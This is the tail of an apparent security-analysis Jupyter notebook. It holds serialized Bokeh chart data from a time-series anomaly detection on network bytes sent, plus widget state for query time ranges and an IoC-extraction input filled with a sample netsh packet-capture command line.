3v4D9Ux2m61w3VPxOLoBi9P+O/afdi4Wp437+P+2PZXzHgP5XF5vyWhui/nQAX21KQ4j+UX49T/WvUPxK2E29QWdQ/f6sPaR0R67+5cNSH0mjbvxtcAgEEpNQ/G1q34yT5n7+rZo3erqXkv/JKcUF5nta/mwUFvShwy78YK6A3BOfeP1BOk0IbM9i/Yce1sWxG5T/kOfGYoFDSv+PpjuVN7ei/eyjkBC0w479UqMMKKuPlv5hzWBpIQ88/paYyCtkY5b8NRHb2SAnlv42azXTJuOI/3l51fMfGzj/1E4s0lan8Pxh09oh0/dy/3brRc9JW7D/zZ0X8z2TqP6fTSm7g8PO/HAU6sSl4yz8sX+MNoJ7bPyeRNXNTL/E/oBopmb/u8T8oyd6g54Hmv0Weqf7YXdG/KKwK5pC7wr8BYVj0rxLtv3lSSBs6E6u/qfTCyNQX07+WwCW4k+TRP5ort86459U/a1UK9lSz4T+sAyWFwcjrv/1FVi6wsJS/ivfsIKV2sj9Zgl2ET3TiP/j+Kww8esa/1dgOPXWf5L/khkXEU0Pwv4U2/DTR+cK/R+/7ub7E8z9ZvNimOivzv8GdvwT3msy/DpvF04qG+T/DQBnLs4vxv0q32c+BW+4/kEWqMmNL9z8f2PRlP/ruP+r11Gqruvg/ByGzyIWf7L9O/RMPa0IBwIshncJnYuE/hYMEi7577r+SlQzmta7wv6YrMGMgXui/H9hAOwVr8b+bvIHO5RvbP1HCL01MJeW/R/9sAEIUwb+RX+mNoufYvxK71LNT++q/tYwSv0sP1r9ILrFJNWSkP7jQLlkg1fg/kJZWKO4t7r+XG81frVH/Py/sVfnkevw/tpF5yak16L/bayQQcRbzP60adZBUJ/K/buPlW8VB8L+QDGvt0AjCP4PVZdA6gcW/lDb1kSziGEBDb2xVUTkYQDSdThHOVvO/UTb59E9V1L+GU9DvJ8Dmv0QuZb5/W70/pQzk7Revvb/x7kHnQEzrvz+F4YKkft+/7giuKWOO6r+mH2O8Om/mv8+8V3GUgtc/qc0Bd75p3z9N6Gg2VFbmvydQru6FK+W/S/YH0pCp479JxFvGWG3wv2Qmp75+mOm/f6TWaWiG3b83x4VA+JPNv0BtdNKr3s2/uOZCh1q/47/LsuOWfbHHv84FNZp8Ury/QvaOGCF/A8DJKeiI+0MCwJO/cLKyKb0/P1U0v4V8jr/AbCI5RZXyPxQvF4TfccM/Bd/CE51R3j8K8VGQHKbiPyrJsQMVROQ/YjQZveit5D+TWihJn0XiP5E8RU7CSLU/3W32urcSw7+68uKQbXDjPyEaErj6hc+/R6+wEko14z8cjK/EIqaFP1Ya6Fqp7Mu/JQLxkrfu1D8prN1Ivn3Qv193U/4Z49s/EbGsZPIy4j/uWD16iC/Gv7pYZ9fZyMm/P5jnKD/47r/kVvLwyVTov5JtLu85v9E/8apSoC5czz/SiNkm9Xndv9THBykEyMK/\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"seasonal\":[-10756,-7953,-8697,-9756,-10696,-9384,-9691,8607,7371,9446,10451,9953,9422,10593,8591,5536,7107,5316,6769,6628,-11261,-8280,-9428,-8756,-10385,-8835,-8347,-9634,-10254,-9288,-9505,7958,6710,9506,9796,8706,8644,9210,8648,6634,6245,5590,9335,7690,-10386,-8661,-9482,-8650,-9974,-9493,-8009,-9429,-9788,-9206,-9218,7140,6131,9240,9113,7648,7648,7913,8416,7361,5392,5710,11862,9021,-9516,-8842,-9364,-8452,-9641,-10039,-7602,-9339,-9454,-8958,-8714,6084,5661,8490,8223,6463,6546,6699,7796,7686,4528,5618,14048,10140,-8612,-9048,-8988,-7986,-7865,-8418,-6074,-7950,-8193,-7776,-6853,4315,4832,6151,5880,5424,4709,5565,6062,6248,3727,4303,10633,8532,-6302,-6906,-6524,-6391,-5789,-6245,-4208,-6142,-6629,-6534,-4936,2855,4081,3858,3764,4527,2756,4475,4259,4727,2775,2730,7286,7253,-4041,-4576,-4198,-4811,-3607,-3979,-2234,-4275,-5042,-5159,-2886,1527,3124,1555,1525,3449,709,3359,2509,3168,1695,982,3111,5395,-1643,-2008,-1625,-3149],\"trend\":[21943,21961,21977,21994,22010,22026,22042,22056,22070,22084,22096,22107,22117,22127,22135,22142,22148,22154,22158,22163,22168,22174,22182,22193,22181,22169,22155,22137,22116,22089,22058,22021,21980,21938,21897,21859,21826,21799,21781,21771,21770,21777,21795,21821,21855,21896,21941,21986,22030,22073,22114,22153,22191,22227,22264,22300,22337,22372,22404,22432,22455,22473,22485,22492,22495,22493,22487,22477,22466,22453,22437,22417,22394,22367,22335,22299,22259,22217,22172,22124,22074,22024,21975,21930,21892,21863,21843,21834,21836,21849,21870,21896,21925,21961,22008,22066,22134,22208,22283,22355,22418,22471,22509,22533,22541,22534,22512,22475,22421,22348,22252,22129,21979,21801,21598,21373,21128,20860,20570,20257,19925,19577,19217,18852,18486,18127,17778,17444,17127,16828,16549,16292,16060,15855,15682,15542,15434,15351,15285,15231,15186,15150,15121,15100,15085,15074,15058,15041,15025,15011,14997,14984,14971,14957,14943,14929,14913,14896,14877,14858,14836,14813,14788,14761,14733,14702,14670,14636],\"weights\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1184\"},\"selection_policy\":{\"id\":\"1183\"}},\"id\":\"1145\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1057\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1143\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"1071\",\"type\":\"Line\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1196\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"click_policy\":\"hide\",\"coordinates\":null,\"group\":null,\"items\":[{\"id\":\"1068\"},{\"id\":\"1095\"},{\"id\":\"1125\"}],\"location\":\"top_left\"},\"id\":\"1067\",\"type\":\"Legend\"},{\"attributes\":{\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"1070\",\"type\":\"Line\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1058\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1065\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"1052\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1059\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"1049\",\"type\":\"AllLabels\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.2},\"fill_color\":{\"value\":\"blue\"},\"hatch_alpha\":{\"value\":0.2},\"hatch_color\":{\"value\":\"blue\"},\"line_alpha\":{\"value\":0.2},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"1149\",\"type\":\"Circle\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1145\"},\"glyph\":{\"id\":\"1147\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1149\"},\"nonselection_glyph\":{\"id\":\"1148\"},\"view\":{\"id\":\"1151\"}},\"id\":\"1150\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1053\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1051\",\"type\":\"AllLabels\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AAAQJZ4zd0IAAPiToTN3Qg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[2]},\"TotalBytesSent\":[48616,45856],\"baseline\":[32232,29906],\"index\":[114,115],\"level_0\":[0,1],\"residual\":[16383,15949],\"score\":{\"__ndarray__\":\"lDb1kSziGEBDb2xVUTkYQA==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[2]},\"seasonal\":[10633,8532],\"trend\":[21598,21373],\"weights\":[1,1]},\"selected\":{\"id\":\"1111\"},\"selection_policy\":{\"id\":\"1110\"}},\"id\":\"1096\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"blue\"},\"hatch_alpha\":{\"value\":0.1},\"hatch_color\":{\"value\":\"blue\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"1148\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1110\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1195\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"active_multi\":{\"id\":\"1152\"},\"tools\":[{\"id\":\"1152\"}]},\"id\":\"1141\",\"type\":\"Toolbar\"},{\"attributes\":{\"label\":{\"value\":\"observed\"},\"renderers\":[{\"id\":\"1045\"}]},\"id\":\"1068\",\"type\":\"LegendItem\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1003\"},\"glyph\":{\"id\":\"1042\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1044\"},\"nonselection_glyph\":{\"id\":\"1043\"},\"view\":{\"id\":\"1046\"}},\"id\":\"1045\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.2},\"fill_color\":{\"value\":\"firebrick\"},\"hatch_color\":{\"value\":\"firebrick\"},\"line_color\":{\"value\":\"firebrick\"},\"marker\":{\"value\":\"circle_x\"},\"size\":{\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1098\",\"type\":\"Scatter\"},{\"attributes\":{},\"id\":\"1111\",\"type\":\"Selection\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1096\"},\"glyph\":{\"id\":\"1098\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1100\"},\"nonselection_glyph\":{\"id\":\"1099\"},\"view\":{\"id\":\"1102\"}},\"id\":\"1101\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"source\":{\"id\":\"1003\"}},\"id\":\"1046\",\"type\":\"CDSView\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1060\",\"type\":\"DaysTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"firebrick\"},\"hatch_alpha\":{\"value\":0.1},\"hatch_color\":{\"value\":\"firebrick\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"firebrick\"},\"marker\":{\"value\":\"circle_x\"},\"size\":{\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1099\",\"type\":\"Scatter\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.2},\"fill_color\":{\"value\":\"firebrick\"},\"hatch_alpha\":{\"value\":0.2},\"hatch_color\":{\"value\":\"firebrick\"},\"line_alpha\":{\"value\":0.2},\"line_color\":{\"value\":\"firebrick\"},\"marker\":{\"value\":\"circle_x\"},\"size\":{\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1100\",\"type\":\"Scatter\"},{\"attributes\":{\"below\":[{\"id\":\"1137\"},{\"id\":\"1142\"}],\"center\":[{\"id\":\"1140\"}],\"height\":120,\"renderers\":[{\"id\":\"1150\"}],\"title\":{\"id\":\"1127\"},\"toolbar\":{\"id\":\"1141\"},\"toolbar_location\":null,\"width\":1200,\"x_range\":{\"id\":\"1129\"},\"x_scale\":{\"id\":\"1133\"},\"y_range\":{\"id\":\"1131\"},\"y_scale\":{\"id\":\"1135\"}},\"id\":\"1126\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"align\":\"right\",\"coordinates\":null,\"group\":null,\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\"},\"id\":\"1142\",\"type\":\"Title\"},{\"attributes\":{\"source\":{\"id\":\"1096\"}},\"id\":\"1102\",\"type\":\"CDSView\"},{\"attributes\":{\"label\":{\"value\":\"anomalies\"},\"renderers\":[{\"id\":\"1101\"}]},\"id\":\"1125\",\"type\":\"LegendItem\"},{\"attributes\":{\"end\":1594624860000.0,\"start\":1593963540000.0},\"id\":\"1008\",\"type\":\"Range1d\"}],\"root_ids\":[\"1157\"]},\"title\":\"Bokeh Application\",\"version\":\"2.4.2\"}};\n",
       "  const render_items = [{\"docid\":\"0293dcfa-f567-4213-8709-48de9c5c78af\",\"root_ids\":[\"1157\"],\"roots\":{\"1157\":\"bd0206b3-1ef4-4301-a7c6-c25f0d9e5cfe\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    let attempts = 0;\n",
       "    const timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1157"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# plot the results retrieved from previous step.\n",
    "ts_decomp_df.mp_timeseries.plot(\n",
    "    y=\"TotalBytesSent\",\n",
    ");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "# End of Session\n"
   ]
  }
 ],
 "metadata": {
  "hide_input": false,
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "vscode": {
   "interpreter": {
    "hash": "245974e5c299ad9c888cb47ad7d7f097035e3d545bc92549ebde7e73bd6f3a70"
   }
  },
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "state": {
     "003d1e6b3c2d47d7b57f58cf38998504": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "100px"
      }
     },
     "021c1c28cda242d1957b7f76ae5f7987": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range",
       "layout": "IPY_MODEL_1bf16094ac074f62a45c534c9ff80d1b",
       "max": 28,
       "min": -28,
       "style": "IPY_MODEL_e6c6872e81f241ff8ddf4b98ba5e173b",
       "value": [
        -1,
        1
       ]
      }
     },
     "034a5b93af564bf6bf2af1ab35ad8531": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DropdownModel",
      "state": {
       "_options_labels": [
        "Second",
        "Minute",
        "Hour",
        "Day",
        "Week"
       ],
       "index": 3,
       "layout": "IPY_MODEL_ee9a7d1a10ef4cd08134263a65aa106e",
       "style": "IPY_MODEL_38e34a2fdeb24023bfe5f4fc153883dd"
      }
     },
     "04657d3011fb4e0eae8d91df4fac028a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "050e07af2a3e45088f13fa138f4ec908": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "05d3d49f32d7430bbdc49da4a1a3ff96": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "99%"
      }
     },
     "0699472fe83a40aab8a317bb3fe3d2b8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "09e81fe91ba34d5d88e54c3662620a10": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0aeb2229773c4a35989db1ca4f720e7c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_26395826bd3f441ebcc92d2c9618c2ae",
        "IPY_MODEL_f5bb3f446da6430eab2d790ad8409c51",
        "IPY_MODEL_1fa711df869b4d2f9d1c7028876ce61e"
       ],
       "layout": "IPY_MODEL_121ab3ba109e416cac77f82795193b2c"
      }
     },
     "0ebd16d168d74cbeb750bdc09c6163b3": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "0f91958248674533a2e8df06a8d58c7d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "1029057be0b24185a7e6d289dcbe51f5": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "10a928ca3b97430f95c25c7e1e43da76": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "121ab3ba109e416cac77f82795193b2c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "12c38d50d6b043479a9293221c2167c4": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "1364f555bdd443d1ae97afdcf443ddc6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "150px",
       "width": "300px"
      }
     },
     "14bbd6888da241079747ad3ab13c5a08": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "1631eca34f774fd8862f1475b6e552ed": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "16fad27b209349c894903d5adf28a9a8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "17728f33c7a547eb9b09d859a5ec96df": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "150px",
       "width": "300px"
      }
     },
     "1782404880e3454ca2fa2fd848e419bd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "1b85dea896cd491081d49956b6ffcae4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "1bb1eb20d0e04ab59fbd9ccf904ba5cd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_330d5f02976f402b9129ddce60ffd625",
        "IPY_MODEL_ff1c7e576594462099db3d58fdc37a8d",
        "IPY_MODEL_5ac2e326d31c484888a816ccca4b1333"
       ],
       "layout": "IPY_MODEL_83189ab1ac8f409b9f4515c86c533900"
      }
     },
     "1bf16094ac074f62a45c534c9ff80d1b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "1dff0f8bc2b34f5499ca6d0f99e0164b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "1fa711df869b4d2f9d1c7028876ce61e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_1631eca34f774fd8862f1475b6e552ed",
       "style": "IPY_MODEL_c370dc8ee1154d7b852fe56c0d1e8dd4",
       "value": "2022-10-28 14:34:59.175155"
      }
     },
     "20201e7053f64f45bce6597a641f60e6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "22a3661f0a0d41f984c5119e6b6ab953": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_0699472fe83a40aab8a317bb3fe3d2b8",
       "style": "IPY_MODEL_44878ede14c44f8f91c506451c4cba95",
       "value": "14:34:59.175155"
      }
     },
     "23f1c66b68d848f6809a03d8afa1cfaf": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "2469a84752064aec8d6884cdf0db8c71": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "25df5ac0dcbc4d6aa23aca408f9d4914": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "26395826bd3f441ebcc92d2c9618c2ae": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_021c1c28cda242d1957b7f76ae5f7987",
        "IPY_MODEL_a2bf52d688044c8d98abd60d1b4d3f8d"
       ],
       "layout": "IPY_MODEL_0f91958248674533a2e8df06a8d58c7d"
      }
     },
     "27b6fabc9ff047fe8d871e41463d8edc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "LabelModel",
      "state": {
       "layout": "IPY_MODEL_7d516693e798457c99dd24295c7f9d9d",
       "style": "IPY_MODEL_82949ff0955746378c492b65f3a40f75"
      }
     },
     "27ed1061326d4449ae5d8f238d2ec4e0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_b06a888f953f4cb5a34ca4154a761e23",
       "style": "IPY_MODEL_1b85dea896cd491081d49956b6ffcae4",
       "value": "15:37:14.642408"
      }
     },
     "2a7627bb6e5444aa98529379cbda7afc": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "2af9c55520d345a098e6b2de6516e0cf": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "2b5cbd7ead624fa7812d7d3fd1a07a04": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_b81d8cab36a4414286985c1c3313b0b5",
        "IPY_MODEL_4668c8ca115342c585ae90c8d1458323",
        "IPY_MODEL_b0871aaaddc34657b04e1b944e6eda2f"
       ],
       "layout": "IPY_MODEL_781110104a9a48b9bb7db13b9b94a3c5"
      }
     },
     "2d772e1ace594b6e82c384762ac092bb": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "2ed4451689b7499884e98ec53bd138cb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "2ee3ffcb4c15499a8b3eba39b3941ad7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "316151e38c6f46249f824771549b5007": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "solid gray 1px",
       "margin": "1pt",
       "padding": "5pt",
       "width": "90%"
      }
     },
     "330d5f02976f402b9129ddce60ffd625": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_b97cb3c5231a4dda9069e162cddff3c3",
        "IPY_MODEL_cd0e9b91b76e4aa6931da0ad89620a11"
       ],
       "layout": "IPY_MODEL_de8c44289b904e6bb8c52e5268ed3e2a"
      }
     },
     "3708397ee4af40f0ae9a725559ad8f45": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "37abfc7d54a0401e87719166e710740d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_dd4ea59adb744577b5982932c50053d5",
       "style": "IPY_MODEL_ba04a5ffdc40450a9603b8040a5de0fb",
       "value": {
        "date": 27,
        "month": 9,
        "year": 2022
       }
      }
     },
     "38e34a2fdeb24023bfe5f4fc153883dd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "3a3c5910a32149bca154c446994800cc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_d14dfc04926a4b8690871a09bb9d4ce3",
       "style": "IPY_MODEL_eaf6de7549be4dc681e449e869e1a656",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "3c5c33bb46134d5daefeacde0b284a70": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Enter a commandline to extract IoCs",
       "layout": "IPY_MODEL_40c741a2ab6c47368998708cfa03b8b9",
       "style": "IPY_MODEL_f7102cc0b01641b793f5277ea2bcf25e",
       "value": "netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt"
      }
     },
     "3ddc71e46d04481da8017eddbebc690f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "3f1d8e2fa20a4e7da6280024008bfc99": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "40c741a2ab6c47368998708cfa03b8b9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "44878ede14c44f8f91c506451c4cba95": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
